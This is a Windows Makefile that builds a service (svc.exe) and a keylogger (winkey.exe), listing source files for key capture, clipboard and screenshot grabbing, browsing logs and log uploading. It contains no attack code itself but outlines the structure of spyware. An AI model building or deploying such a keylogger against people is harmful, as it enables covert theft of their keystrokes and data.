TARGET_SERVICE = svc.exe
TARGET_KEYLOGGER = winkey.exe

CC = cl
CFLAGS = /WX /Wall /std:c++17 /EHsc  /D "_UNICODE" /D "UNICODE" /Wv:18
LINK = link /DYNAMICBASE "kernel32.lib" "user32.lib" "gdi32.lib" "winspool.lib" "comdlg32.lib" "advapi32.lib" "shell32.lib" "ole32.lib" "oleaut32.lib" "uuid.lib" "odbc32.lib" "odbccp32.lib"

SRC_SERVICE = .\Service\srcs\main.cpp 				\
              .\Service\srcs\Manager.cpp 			\
              .\Service\srcs\Utils.cpp   			\
			  .\Service\srcs\ServiceTinky.cpp

SRC_KEYLOGGER = .\Keylogger\srcs\main.cpp 			\
                .\Keylogger\srcs\callback.cpp 		\
				.\Keylogger\srcs\clipboard.cpp 		\
				.\Keylogger\srcs\logs.cpp 			\
				.\Keylogger\srcs\NavLogs.cpp		\
				.\Keylogger\srcs\screenShot.cpp		\
				.\Keylogger\srcs\uploadLogs.cpp		\
				.\Keylogger\srcs\Utils.cpp

OBJ_SERVICE = $(SRC_SERVICE:.cpp=.obj)
OBJ_KEYLOGGER = $(SRC_KEYLOGGER:.cpp=.obj)

.cpp.obj:
	$(CC) $(CFLAGS) /nologo /I.\Service\inc /I.\Keylogger\inc /c $< /Fo: $@

all: $(TARGET_KEYLOGGER) $(TARGET_SERVICE) 

$(TARGET_KEYLOGGER): $(OBJ_KEYLOGGER)
	$(LINK) /nologo $(OBJ_KEYLOGGER) /OUT:$(TARGET_KEYLOGGER)

$(TARGET_SERVICE): $(OBJ_SERVICE)
	$(LINK) /nologo $(OBJ_SERVICE) /OUT:$(TARGET_SERVICE)

clean:
	del $(OBJ_KEYLOGGER) $(OBJ_SERVICE)

fclean: clean
	del $(TARGET_KEYLOGGER) $(TARGET_SERVICE)

re: fclean all